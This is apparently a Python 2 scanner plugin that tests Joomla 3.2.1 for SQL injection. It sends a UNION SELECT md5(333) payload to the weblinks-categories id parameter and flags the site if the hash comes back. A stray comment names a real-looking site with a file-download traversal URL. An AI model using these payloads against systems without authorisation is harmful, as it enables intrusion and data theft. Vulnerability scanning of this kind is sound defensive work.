#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    #www.sdbys.cn/module/download/downfile.jsp?filename=downfile.jsp&pathfile=module/download/downfile.jsp
    try:  
        result=[]                               
        detail=''
       
        domain=ob['domain']
        url="index.php/weblinks-categories?id=0%20%29%20union%20select%20md5(333)%20from%20%60k59cv_users%60%20--%20%29"
        geturl="%s://%s%s%s"%(ob['scheme'],domain,ob['base_path'],url)
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        if content.find("310dcbbf4cce62f762a2aaa148d556bd")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:joomal3.2.1sqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:joomal3.2.1sqlinjection.py, run_domain function :" + str(e))
    return result

